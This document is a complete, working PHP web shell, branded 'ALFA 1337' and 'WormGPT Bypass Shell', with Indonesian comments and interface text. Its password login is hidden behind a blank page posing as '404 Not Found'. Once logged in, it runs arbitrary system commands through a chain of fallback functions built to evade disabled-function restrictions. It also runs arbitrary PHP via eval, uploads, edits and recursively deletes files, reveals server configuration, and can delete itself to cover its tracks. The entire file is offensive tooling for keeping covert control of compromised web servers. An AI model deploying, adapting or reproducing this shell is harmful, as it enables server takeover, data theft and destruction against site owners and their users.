<?php
session_start();
$password = 'Kjkszpj12@@'; 
$login_failed = false;

// Fungsi untuk eksekusi perintah dengan fallback
function execute_command($cmd) {
    $output = '';
    $disabled_functions = array_map('trim', explode(',', ini_get('disable_functions')));

    // Try shell_exec
    if (function_exists('shell_exec') && !in_array('shell_exec', $disabled_functions)) {
        $output = shell_exec($cmd . ' 2>&1');
        return "[shell_exec]:\n" . $output;
    }
    // Try passthru
    elseif (function_exists('passthru') && !in_array('passthru', $disabled_functions)) {
        ob_start();
        passthru($cmd . ' 2>&1');
        $output = ob_get_clean();
        return "[passthru]:\n" . $output;
    }
    // Try exec
    elseif (function_exists('exec') && !in_array('exec', $disabled_functions)) {
        $arr_output = array();
        exec($cmd . ' 2>&1', $arr_output);
        $output = implode("\n", $arr_output);
        return "[exec]:\n" . $output;
    }
    // Try system
    elseif (function_exists('system') && !in_array('system', $disabled_functions)) {
        ob_start();
        system($cmd . ' 2>&1');
        $output = ob_get_clean();
        return "[system]:\n" . $output;
    }
    // Try proc_open (most powerful, but often disabled)
    elseif (function_exists('proc_open') && !in_array('proc_open', $disabled_functions)) {
        $descriptorspec = array(
            0 => array("pipe", "r"),  // stdin
            1 => array("pipe", "w"),  // stdout
            2 => array("pipe", "w")   // stderr
        );
        $process = proc_open($cmd, $descriptorspec, $pipes);
        if (is_resource($process)) {
            fclose($pipes[0]); // Close stdin
            $output = stream_get_contents($pipes[1]); // Read stdout
            $output .= stream_get_contents($pipes[2]); // Read stderr
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            return "[proc_open]:\n" . $output;
        }
    }
    return "ERROR: Semua fungsi eksekusi perintah dinonaktifkan atau gagal. Perintah tidak dapat dijalankan.";
}

// Helper function to format permissions
function get_perms($path) {
    $perms = @fileperms($path); // Suppress errors
    if ($perms === false) return '????';
    $info = '';
    // Type
    if (($perms & 0xC000) == 0xC000) $info .= 's'; // Socket
    elseif (($perms & 0xA000) == 0xA000) $info .= 'l'; // Symbolic Link
    elseif (($perms & 0x8000) == 0x8000) $info .= '-'; // Regular
    elseif (($perms & 0x6000) == 0x6000) $info .= 'b'; // Block special
    elseif (($perms & 0x4000) == 0x4000) $info .= 'd'; // Directory
    elseif (($perms & 0x2000) == 0x2000) $info .= 'c'; // Character special
    elseif (($perms & 0x1000) == 0x1000) $info .= 'p'; // FIFO pipe
    else $info .= '?'; // Unknown
    
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
                (($perms & 0x0800) ? 's' : 'x' ) :
                (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
                (($perms & 0x0400) ? 's' : 'x' ) :
                (($perms & 0x0400) ? 'S' : '-'));
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
                (($perms & 0x0200) ? 't' : 'x' ) :
                (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

// Handle login attempt
if (isset($_POST['password'])) {
    if ($_POST['password'] === $password) {
        $_SESSION['authenticated'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']); // Redirect to clean URL after login
        exit();
    } else {
        $login_failed = true;
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    unset($_SESSION['authenticated']);
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit();
}

// Jika sudah terotentikasi, tampilkan antarmuka webshell
if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
    // --- WEBSHELL INTERFACE ---
    $current_dir = getcwd(); // Direktori awal saat script dijalankan
    $message = ''; // Untuk pesan sukses/error umum
    $command_output = '';
    $upload_status = '';
    $file_content_to_edit = '';
    $file_to_edit_path = '';
    $php_eval_output = '';

    // --- LOGIKA SELF-DELETE ---
    if (isset($_GET['self_delete']) && $_GET['self_delete'] === 'confirm') {
        $script_path = __FILE__;
        if (unlink($script_path)) {
            echo "<script>alert('WormGPT Bypass Shell berhasil dihapus. Anda akan dialihkan.'); window.location.href='/';</script>";
            exit();
        } else {
            $message = "<span class='error-message-shell'>ERROR: Gagal menghapus webshell. Pastikan izin tulis pada file ini.</span>";
        }
    }

    // --- LOGIKA PERUBAHAN DIREKTORI (Prioritas: GET, lalu POST) ---
    // Coba ubah direktori berdasarkan parameter GET (untuk navigasi manajer file)
    if (isset($_GET['dir'])) {
        $target_dir = $_GET['dir'];
        // Resolusi path untuk keamanan dan akurasi, handle '..'
        $resolved_target_dir = realpath($target_dir);

        if ($resolved_target_dir === false) {
            $message = "<span class='error-message-shell'>ERROR: Direktori tidak valid atau tidak dapat diakses: " . htmlspecialchars($_GET['dir']) . "</span>";
        } else if (is_dir($resolved_target_dir)) {
            if (chdir($resolved_target_dir)) {
                $current_dir = getcwd();
            } else {
                $message = "<span class='error-message-shell'>ERROR: Gagal mengubah direktori ke: " . htmlspecialchars($resolved_target_dir) . " (Kemungkinan masalah izin akses atau open_basedir).</span>";
            }
        } else {
            $message = "<span class='error-message-shell'>ERROR: Target bukan direktori: " . htmlspecialchars($_GET['dir']) . "</span>";
        }
    }
    // Coba ubah direktori berdasarkan POST (dari form "Ubah Direktori")
    elseif (isset($_POST['change_dir']) && !empty($_POST['new_dir'])) {
        $new_dir_input = $_POST['new_dir'];
        $resolved_new_dir = realpath($new_dir_input); // Resolusi path

        if ($resolved_new_dir === false) {
             $message = "<span class='error-message-shell'>ERROR: Direktori tidak valid atau tidak dapat diakses: " . htmlspecialchars($new_dir_input) . "</span>";
        } else if (is_dir($resolved_new_dir)) {
            if (chdir($resolved_new_dir)) {
                $current_dir = getcwd();
            } else {
                $message = "<span class='error-message-shell'>ERROR: Gagal mengubah direktori ke: " . htmlspecialchars($resolved_new_dir) . " (Kemungkinan masalah izin akses atau open_basedir).</span>";
            }
        } else {
            $message = "<span class='error-message-shell'>ERROR: Target bukan direktori: " . htmlspecialchars($new_dir_input) . "</span>";
        }
    }

    // --- LOGIKA UPLOAD FILE ---
    if (isset($_POST['upload_file'])) {
        $upload_target_dir = isset($_POST['upload_target_dir']) ? $_POST['upload_target_dir'] : $current_dir;
        $resolved_upload_target_dir = realpath($upload_target_dir);

        if ($resolved_upload_target_dir === false || !is_dir($resolved_upload_target_dir)) {
            $upload_status = "<span class='error-message-shell'>ERROR UPLOAD: Direktori target tidak valid atau tidak ada: " . htmlspecialchars($upload_target_dir) . "</span>";
        } elseif (!is_writable($resolved_upload_target_dir)) {
            $upload_status = "<span class='error-message-shell'>ERROR UPLOAD: Direktori target tidak memiliki izin tulis: " . htmlspecialchars($resolved_upload_target_dir) . "</span>";
        } elseif (isset($_FILES['fileToUpload']) && $_FILES['fileToUpload']['error'] == UPLOAD_ERR_OK) {
            $file_name = basename($_FILES['fileToUpload']['name']);
            $target_file = $resolved_upload_target_dir . DIRECTORY_SEPARATOR . $file_name;

            if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $target_file)) {
                $upload_status = "<span class='success-message-shell'>File '" . htmlspecialchars($file_name) . "' berhasil diunggah ke: " . htmlspecialchars($resolved_upload_target_dir) . "</span>";
            } else {
                $upload_status = "<span class='error-message-shell'>ERROR UPLOAD: Gagal mengunggah file. Pastikan izin direktori target.</span>";
            }
        } else {
            $error_code = isset($_FILES['fileToUpload']['error']) ? $_FILES['fileToUpload']['error'] : 0;
            $error_msg = "Terjadi kesalahan yang tidak diketahui.";
            switch ($error_code) {
                case UPLOAD_ERR_INI_SIZE: $error_msg = "Ukuran file melebihi batas upload server (upload_max_filesize)."; break;
                case UPLOAD_ERR_FORM_SIZE: $error_msg = "Ukuran file melebihi batas form HTML (MAX_FILE_SIZE)."; break;
                case UPLOAD_ERR_PARTIAL: $error_msg = "File hanya terunggah sebagian."; break;
                case UPLOAD_ERR_NO_FILE: $error_msg = "Tidak ada file yang dipilih untuk diunggah."; break;
                case UPLOAD_ERR_NO_TMP_DIR: $error_msg = "Direktori temporary hilang."; break;
                case UPLOAD_ERR_CANT_WRITE: $error_msg = "Gagal menulis file ke disk."; break;
                case UPLOAD_ERR_EXTENSION: $error_msg = "Ekstensi PHP menghentikan upload file."; break;
            }
            $upload_status = "<span class='error-message-shell'>ERROR UPLOAD: " . $error_msg . "</span>";
        }
    }

    // --- LOGIKA HAPUS FILE/FOLDER ---
    if (isset($_GET['delete']) && !empty($_GET['delete'])) {
        $target_to_delete = base64_decode($_GET['delete']);
        $full_path = $current_dir . DIRECTORY_SEPARATOR . $target_to_delete;

        if (file_exists($full_path)) {
            if (is_dir($full_path)) {
                // Recursive delete for directories
                function rrmdir($dir) {
                    if (is_dir($dir)) {
                        $objects = scandir($dir);
                        foreach ($objects as $object) {
                            if ($object != "." && $object != "..") {
                                if (is_dir($dir. DIRECTORY_SEPARATOR .$object))
                                    rrmdir($dir. DIRECTORY_SEPARATOR .$object);
                                else
                                    unlink($dir. DIRECTORY_SEPARATOR .$object);
                            }
                        }
                        return rmdir($dir);
                    }
                    return false;
                }
                if (rrmdir($full_path)) {
                    $message = "<span class='success-message-shell'>Direktori '" . htmlspecialchars($target_to_delete) . "' berhasil dihapus.</span>";
                } else {
                    $message = "<span class='error-message-shell'>ERROR: Gagal menghapus direktori '" . htmlspecialchars($target_to_delete) . "'. Pastikan izin akses.</span>";
                }
            } else {
                if (unlink($full_path)) {
                    $message = "<span class='success-message-shell'>File '" . htmlspecialchars($target_to_delete) . "' berhasil dihapus.</span>";
                } else {
                    $message = "<span class='error-message-shell'>ERROR: Gagal menghapus file '" . htmlspecialchars($target_to_delete) . "'. Pastikan izin akses.</span>";
                }
            }
        } else {
            $message = "<span class='error-message-shell'>ERROR: Target '" . htmlspecialchars($target_to_delete) . "' tidak ditemukan.</span>";
        }
        header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($current_dir));
        exit();
    }

    // --- LOGIKA BUAT FOLDER ---
    if (isset($_POST['create_folder']) && !empty($_POST['new_folder_name'])) {
        $folder_name = $_POST['new_folder_name'];
        $new_folder_path = $current_dir . DIRECTORY_SEPARATOR . $folder_name;

        if (mkdir($new_folder_path)) {
            $message = "<span class='success-message-shell'>Folder '" . htmlspecialchars($folder_name) . "' berhasil dibuat.</span>";
        } else {
            $message = "<span class='error-message-shell'>ERROR: Gagal membuat folder '" . htmlspecialchars($folder_name) . "'. Pastikan izin tulis.</span>";
        }
    }

    // --- LOGIKA LIHAT/EDIT FILE ---
    if (isset($_GET['view_edit']) && !empty($_GET['view_edit'])) {
        $file_to_edit_path = base64_decode($_GET['view_edit']);
        $full_file_path = $current_dir . DIRECTORY_SEPARATOR . $file_to_edit_path;

        if (file_exists($full_file_path) && is_file($full_file_path) && is_readable($full_file_path)) {
            $file_content_to_edit = htmlspecialchars(file_get_contents($full_file_path));
            $message = "<span class='success-message-shell'>Melihat/Mengedit file: " . htmlspecialchars($file_to_edit_path) . "</span>";
        } else {
            $message = "<span class='error-message-shell'>ERROR: Gagal membaca file '" . htmlspecialchars($file_to_edit_path) . "'. Pastikan file ada dan dapat dibaca.</span>";
        }
    }

    // --- LOGIKA SIMPAN FILE ---
    if (isset($_POST['save_file']) && !empty($_POST['file_path_to_save']) && isset($_POST['file_content_to_save'])) {
        $file_path_to_save = $_POST['file_path_to_save'];
        $content_to_save = $_POST['file_content_to_save'];
        $full_save_path = $current_dir . DIRECTORY_SEPARATOR . $file_path_to_save;

        if (file_exists($full_save_path) && is_file($full_save_path) && is_writable($full_save_path)) {
            if (file_put_contents($full_save_path, $content_to_save) !== false) {
                $message = "<span class='success-message-shell'>File '" . htmlspecialchars($file_path_to_save) . "' berhasil disimpan.</span>";
            } else {
                $message = "<span class='error-message-shell'>ERROR: Gagal menyimpan file '" . htmlspecialchars($file_path_to_save) . "'. Pastikan izin tulis.</span>";
            }
        } elseif (!file_exists($full_save_path) && is_writable(dirname($full_save_path))) {
            // Jika file tidak ada, coba buat baru
            if (file_put_contents($full_save_path, $content_to_save) !== false) {
                $message = "<span class='success-message-shell'>File baru '" . htmlspecialchars($file_path_to_save) . "' berhasil dibuat dan disimpan.</span>";
            } else {
                $message = "<span class='error-message-shell'>ERROR: Gagal membuat dan menyimpan file baru '" . htmlspecialchars($file_path_to_save) . "'. Pastikan izin tulis di direktori.</span>";
            }
        }
        else {
            $message = "<span class='error-message-shell'>ERROR: File '" . htmlspecialchars($file_path_to_save) . "' tidak ditemukan atau tidak dapat ditulis, dan direktori tidak memiliki izin tulis untuk membuat file baru.</span>";
        }
        header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($current_dir));
        exit();
    }

    // Handle eksekusi perintah
    if (isset($_POST['command']) && !empty($_POST['command'])) {
        $cmd = $_POST['command'];
        $command_output .= ">>> " . htmlspecialchars($cmd) . "\n";
        $command_output .= execute_command($cmd) . "\n";
    }

    // Handle PHP Eval
    if (isset($_POST['php_code']) && !empty($_POST['php_code'])) {
        $php_code = $_POST['php_code'];
        $php_eval_output .= ">>> eval(\"" . htmlspecialchars(substr($php_code, 0, 100)) . "...\");\n";
        ob_start();
        try {
            eval($php_code);
        } catch (ParseError $e) {
            echo "Parse Error: " . $e->getMessage();
        } catch (Throwable $e) {
            echo "Runtime Error: " . $e->getMessage();
        }
        $php_eval_output .= ob_get_clean();
    }

    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>CyberSecurity MEMBER ALFA 1337</title>
        <style>
            body { font-family: 'Consolas', monospace; background-color: #1a1a1a; color: #00ff00; margin: 0; padding: 20px; }
            .container { max-width: 1200px; margin: auto; background-color: #000; padding: 20px; border: 1px solid #00ff00; box-shadow: 0 0 10px rgba(0, 255, 0, 0.5); }
            h1 { color: #00ff00; text-align: center; margin-bottom: 30px; text-shadow: 0 0 5px #00ff00; }
            .current-dir { margin-bottom: 15px; border-bottom: 1px dashed #00ff00; padding-bottom: 10px; color: #00ccff; }
            form { margin-bottom: 20px; }
            input[type="text"], input[type="file"], textarea {
                width: calc(100% - 22px);
                padding: 10px;
                margin-top: 5px;
                border: 1px solid #00ff00;
                background-color: #333;
                color: #00ff00;
                font-family: 'Consolas', monospace;
                box-sizing: border-box;
            }
            input[type="submit"], button {
                padding: 10px 20px;
                background-color: #00ff00;
                color: #000;
                border: none;
                cursor: pointer;
                margin-top: 10px;
                font-weight: bold;
                transition: background-color 0.3s ease, color 0.3s ease;
            }
            input[type="submit"]:hover, button:hover {
                background-color: #00cc00;
                color: #fff;
            }
            pre {
                background-color: #000;
                border: 1px solid #00ff00;
                padding: 15px;
                max-height: 400px;
                overflow: auto;
                color: #00ff00;
                white-space: pre-wrap;
                word-wrap: break-word;
            }
            .logout-btn { float: right; margin-top: -50px; }
            .self-delete-btn { background-color: #ff0000 !important; margin-right: 10px; }
            .self-delete-btn:hover { background-color: #cc0000 !important; }
            .error-message-shell { color: #ff0000; font-weight: bold; margin-bottom: 15px; }
            .success-message-shell { color: #00ff00; font-weight: bold; margin-bottom: 15px; }
            .warning-message-shell { color: #ffff00; font-weight: bold; margin-bottom: 15px; }
            .section-divider { border-top: 1px dashed #00ff00; margin-top: 30px; padding-top: 20px; }
            .file-manager table { width: 100%; border-collapse: collapse; margin-top: 15px; }
            .file-manager th, .file-manager td { border: 1px solid #006600; padding: 8px; text-align: left; }
            .file-manager th { background-color: #003300; color: #00ff00; }
            .file-manager td { color: #00ff00; }
            .file-manager .dir-name { color: #ffff00; font-weight: bold; }
            .file-manager .file-name { color: #00ccff; }
            .file-manager .up-dir { font-weight: bold; color: #ff6600; }
            .file-manager .actions button {
                padding: 3px 8px;
                margin: 2px;
                background-color: #006600;
                color: #fff;
                border-radius: 3px;
                font-size: 0.8em;
            }
            .file-manager .actions button.delete { background-color: #cc0000; }
            .file-manager .actions button:hover { background-color: #009900; }
            .file-manager .actions button.delete:hover { background-color: #ff0000; }
            .system-info table { width: 100%; border-collapse: collapse; margin-top: 15px; }
            .system-info th, .system-info td { border: 1px solid #006600; padding: 8px; text-align: left; }
            .system-info th { background-color: #003300; color: #00ff00; width: 30%; }
            .system-info td { color: #00ff00; }
            .file-editor textarea { height: 400px; }
            .php-eval-area textarea { height: 200px; }
            .phpinfo-btn { background-color: #009900; }
            .phpinfo-btn:hover { background-color: #006600; }
        </style>
    </head>
    <body>
        <div class="container">
            <button class="self-delete-btn" onclick="if(confirm('PERINGATAN! Ini akan menghapus webshell ini secara permanen. Lanjutkan?')) { window.location.href='?self_delete=confirm'; }">Self-Delete Webshell</button>
            <a href="?logout=1" class="logout-btn"><button>Logout</button></a>
            <h1>CyberSecurity MEMBER ALFA 1337</h1>
            <p>Developer @Kjkszpj12@@ X MEMBER ALFA 1337</p>
            <a href="//t.me/Kjkszpj12@@" class="logout-btn"><button>@Kjkszpj12@@</button></a>

            <?php
            // Menampilkan pesan global (error/sukses/warning)
            if (!empty($message)) {
                echo "<p>" . $message . "</p>";
            }
            if (!empty($upload_status)) {
                echo "<p>" . $upload_status . "</p>";
            }
            // Peringatan versi PHP
            if (version_compare(PHP_VERSION, '5.4.0', '<')) {
                echo "<p class='warning-message-shell'>PERINGATAN: Versi PHP Anda (" . PHP_VERSION . ") sudah sangat lama. Beberapa fitur mungkin tidak berfungsi optimal atau rentan. Sangat disarankan untuk mengupgrade ke PHP 7.x atau lebih tinggi.</p>";
            }
            ?>

            <div class="current-dir">
                <strong>Direktori Saat Ini:</strong> <?php echo htmlspecialchars($current_dir); ?>
            </div>

            <form method="POST" action="">
                <label for="new_dir">Ubah Direktori (cd):</label><br>
                <input type="text" id="new_dir" name="new_dir" value="<?php echo htmlspecialchars($current_dir); ?>" placeholder="Masukkan path baru, misal: /home/user/public_html atau /etc/apache2"><br>
                <input type="submit" name="change_dir" value="Ubah Direktori">
            </form>

            <div class="file-manager section-divider">
                <h2>Manajer File: <?php echo htmlspecialchars($current_dir); ?></h2>
                <form method="POST" action="">
                    <label for="new_folder_name">Buat Folder Baru:</label><br>
                    <input type="text" id="new_folder_name" name="new_folder_name" placeholder="Nama folder baru"><br>
                    <input type="submit" name="create_folder" value="Buat Folder">
                </form>

                <table>
                    <thead>
                        <tr>
                            <th>Nama</th>
                            <th>Tipe</th>
                            <th>Izin</th>
                            <th>Pemilik/Grup</th>
                            <th>Ukuran</th>
                            <th>Modifikasi</th>
                            <th>Aksi</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php
                        // Link to parent directory
                        $parent_dir = dirname($current_dir);
                        if ($current_dir != '/' && !preg_match('/^[a-zA-Z]:\\\\$/', $current_dir)) { // Cek untuk Windows drive root juga
                            echo '<tr>';
                            echo '<td class="up-dir"><a href="?dir=' . urlencode($parent_dir) . '">.. (Direktori Induk)</a></td>';
                            echo '<td></td><td></td><td></td><td></td><td></td><td></td>';
                            echo '</tr>';
                        }

                        // List directories and files
                        $items = @scandir($current_dir); // Suppress errors if permission denied
                        if ($items === false) {
                            echo "<tr><td colspan='7'><span class='error-message-shell'>Gagal membaca direktori: Izin ditolak atau direktori tidak ada (Kemungkinan open_basedir aktif).</span></td></tr>";
                        } else {
                            $dirs = array();
                            $files = array();
                            foreach ($items as $item) {
                                if ($item == '.' || $item == '..') continue;
                                $full_path = $current_dir . DIRECTORY_SEPARATOR . $item;
                                if (@is_dir($full_path)) { // Suppress errors for is_dir
                                    $dirs[] = $item;
                                } else {
                                    $files[] = $item;
                                }
                            }

                            // Sort and display directories
                            sort($dirs);
                            foreach ($dirs as $dir) {
                                $full_path = $current_dir . DIRECTORY_SEPARATOR . $dir;
                                $owner_name = 'N/A';
                                $group_name = 'N/A';
                                if (function_exists('posix_getpwuid') && function_exists('fileowner')) {
                                    $owner_info = @posix_getpwuid(@fileowner($full_path));
                                    $owner_name = $owner_info ? $owner_info['name'] : 'N/A';
                                }
                                if (function_exists('posix_getgrgid') && function_exists('filegroup')) {
                                    $group_info = @posix_getgrgid(@filegroup($full_path));
                                    $group_name = $group_info ? $group_info['name'] : 'N/A';
                                }
                                
                                echo '<tr>';
                                echo '<td class="dir-name"><a href="?dir=' . urlencode($full_path) . '">' . htmlspecialchars($dir) . '/</a></td>';
                                echo '<td>Direktori</td>';
                                echo '<td>' . get_perms($full_path) . '</td>';
                                echo '<td>' . htmlspecialchars($owner_name) . '/' . htmlspecialchars($group_name) . '</td>';
                                echo '<td>-</td>';
                                echo '<td>' . date("Y-m-d H:i:s", @filemtime($full_path)) . '</td>';
                                echo '<td class="actions">';
                                echo '<button class="delete" onclick="if(confirm(\'Yakin ingin menghapus direktori ' . htmlspecialchars($dir) . ' beserta isinya?\')) { window.location.href=\'?dir=' . urlencode($current_dir) . '&delete=' . base64_encode($dir) . '\'; }">Hapus</button>';
                                echo '</td>';
                                echo '</tr>';
                            }

                            // Sort and display files
                            sort($files);
                            foreach ($files as $file) {
                                $full_path = $current_dir . DIRECTORY_SEPARATOR . $file;
                                $file_size = @filesize($full_path);
                                $size_display = ($file_size !== false) ? round($file_size / 1024, 2) . ' KB' : 'N/A';
                                
                                $owner_name = 'N/A';
                                $group_name = 'N/A';
                                if (function_exists('posix_getpwuid') && function_exists('fileowner')) {
                                    $owner_info = @posix_getpwuid(@fileowner($full_path));
                                    $owner_name = $owner_info ? $owner_info['name'] : 'N/A';
                                }
                                if (function_exists('posix_getgrgid') && function_exists('filegroup')) {
                                    $group_info = @posix_getgrgid(@filegroup($full_path));
                                    $group_name = $group_info ? $group_info['name'] : 'N/A';
                                }

                                echo '<tr>';
                                echo '<td class="file-name">' . htmlspecialchars($file) . '</td>';
                                echo '<td>File</td>';
                                echo '<td>' . get_perms($full_path) . '</td>';
                                echo '<td>' . htmlspecialchars($owner_name) . '/' . htmlspecialchars($group_name) . '</td>';
                                echo '<td>' . $size_display . '</td>';
                                echo '<td>' . date("Y-m-d H:i:s", @filemtime($full_path)) . '</td>';
                                echo '<td class="actions">';
                                echo '<a href="?dir=' . urlencode($current_dir) . '&view_edit=' . base64_encode($file) . '"><button>Lihat/Edit</button></a>';
                                echo '<a href="' . urlencode($full_path) . '" download="' . htmlspecialchars($file) . '"><button>Unduh</button></a>';
                                echo '<button class="delete" onclick="if(confirm(\'Yakin ingin menghapus file ' . htmlspecialchars($file) . '?\')) { window.location.href=\'?dir=' . urlencode($current_dir) . '&delete=' . base64_encode($file) . '\'; }">Hapus</button>';
                                echo '</td>';
                                echo '</tr>';
                            }
                        }
                        ?>
                    </tbody>
                </table>
            </div>

            <?php if (!empty($file_content_to_edit)): ?>
            <div class="file-editor section-divider">
                <h2>Edit File: <?php echo htmlspecialchars($file_to_edit_path); ?></h2>
                <form method="POST" action="">
                    <input type="hidden" name="file_path_to_save" value="<?php echo htmlspecialchars($file_to_edit_path); ?>">
                    <textarea name="file_content_to_save"><?php echo $file_content_to_edit; ?></textarea><br>
                    <input type="submit" name="save_file" value="Simpan Perubahan">
                </form>
            </div>
            <?php endif; ?>

            <div class="upload-section section-divider">
                <h2>Unggah File</h2>
                <form method="POST" action="" enctype="multipart/form-data">
                    <label for="fileToUpload">Pilih File:</label><br>
                    <input type="file" id="fileToUpload" name="fileToUpload"><br>
                    <label for="upload_target_dir">Direktori Target Unggah:</label><br>
                    <input type="text" id="upload_target_dir" name="upload_target_dir" value="<?php echo htmlspecialchars($current_dir); ?>" placeholder="Direktori tempat file akan diunggah"><br>
                    <input type="submit" name="upload_file" value="Unggah File">
                </form>
            </div>

            <div class="section-divider">
                <form method="POST" action="">
                    <input type="hidden" name="current_dir_hidden" value="<?php echo htmlspecialchars($current_dir); ?>">
                    <label for="command">Jalankan Perintah (CMD):</label><br>
                    <input type="text" id="command" name="command" placeholder="Misal: ls -la, cat /etc/passwd, php -v"><br>
                    <input type="submit" value="Jalankan Perintah">
                </form>
            </div>

            <?php if (!empty($command_output)): ?>
                <h2>Output Perintah:</h2>
                <pre><?php echo htmlspecialchars($command_output); ?></pre>
            <?php endif; ?>

            <div class="section-divider">
                <form method="POST" action="">
                    <label for="php_code">Eksekusi Kode PHP (eval):</label><br>
                    <textarea id="php_code" name="php_code" class="php-eval-area" placeholder="Masukkan kode PHP, misal: echo phpinfo();"></textarea><br>
                    <input type="submit" value="Jalankan PHP">
                </form>
            </div>

            <?php if (!empty($php_eval_output)): ?>
                <h2>Output PHP Eval:</h2>
                <pre><?php echo htmlspecialchars($php_eval_output); ?></pre>
            <?php endif; ?>

            <div class="system-info section-divider">
                <h2>Informasi Sistem</h2>
                <button class="phpinfo-btn" onclick="window.open('?phpinfo=1', '_blank');">Lihat phpinfo() Lengkap</button>
                <table>
                    <tr>
                        <th>Versi PHP</th>
                        <td><?php echo PHP_VERSION; ?></td>
                    </tr>
                    <tr>
                        <th>Sistem Operasi</th>
                        <td><?php echo php_uname(); ?></td>
                    </tr>
                    <tr>
                        <th>User Server</th>
                        <td><?php
                            echo function_exists('get_current_user') ? get_current_user() : 'N/A';
                            if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
                                $user_info = @posix_getpwuid(@posix_geteuid());
                                if ($user_info) {
                                    echo " (" . $user_info['name'] . ")";
                                }
                            }
                        ?></td>
                    </tr>
                    <tr>
                        <th>Server API (SAPI)</th>
                        <td><?php echo php_sapi_name(); ?></td>
                    </tr>
                    <tr>
                        <th>Fungsi Dinonaktifkan</th>
                        <td><?php
                            $disabled_funcs = ini_get('disable_functions');
                            echo empty($disabled_funcs) ? 'Tidak ada' : htmlspecialchars($disabled_funcs);
                        ?></td>
                    </tr>
                    <tr>
                        <th>open_basedir</th>
                        <td><?php
                            $open_basedir = ini_get('open_basedir');
                            echo empty($open_basedir) ? 'Tidak aktif' : htmlspecialchars($open_basedir);
                        ?></td>
                    </tr>
                    <tr>
                        <th>Max Execution Time</th>
                        <td><?php echo ini_get('max_execution_time'); ?> detik</td>
                    </tr>
                    <tr>
                        <th>Upload Max Filesize</th>
                        <td><?php echo ini_get('upload_max_filesize'); ?></td>
                    </tr>
                    <tr>
                        <th>Memory Limit</th>
                        <td><?php echo ini_get('memory_limit'); ?></td>
                    </tr>
                </table>
            </div>
        </div>
    </body>
    </html>
    <?php
    // Tampilkan phpinfo() jika diminta
    if (isset($_GET['phpinfo']) && $_GET['phpinfo'] == '1') {
        echo "<div style='background-color: #000; color: #fff; padding: 20px; border: 1px solid #fff; margin-top: 20px;'>";
        phpinfo();
        echo "</div>";
        exit(); // Hentikan eksekusi script setelah menampilkan phpinfo
    }

} else {
    // --- LOGIN FORM ---
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>CyberSecurity MEMBER ALFA 1337</title>
        <style>
            body { font-family: 'Consolas', monospace; background-color: #ffffff; color: #ffffff; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
            .login-container { background-color: #ffffff; padding: 30px; border: 1px solid #ffffff; box-shadow: 0 0 15px rgb(255, 255, 255); text-align: center; }
            h1 { color: #ffffff; margin-bottom: 20px; text-shadow: 0 0 5px #ffffff; }
            input[type="password"] {
                width: calc(100% - 22px);
                padding: 10px;
                margin-top: 10px;
                border: 1px solid #ffffff;
                background-color: #ffffff;
                color: #ffffff;
                font-family: 'Consolas', monospace;
                box-sizing: border-box;
            }
            input[type="submit"] {
                padding: 10px 20px;
                background-color: #ffffff;
                color: #ffffff;
                border: none;
                cursor: pointer;
                margin-top: 15px;
                font-weight: bold;
                transition: background-color 0.3s ease;
            }
            input[type="submit"]:hover {
                background-color: #ffffff;
            }
            .error-message { color: #ff0000; font-weight: bold; margin-top: 10px; }
            .password-warning { color: #ffff00; margin-top: 20px; font-size: 0.9em; }
        </style>
    </head>
    <body>
        <div class="login-container">
            <form method="POST" action="">
                <input type="password" name="password" placeholder="404 Not Found" required autofocus><br>
                <input type="submit" value="Login">
            </form>
            <?php if ($login_failed): ?>
                <p class="error-message">Password salah!</p>
            <?php endif; ?>
            <p class="password-warning"></p>
        </div>
    </body>
    </html>
    <?php
}
?>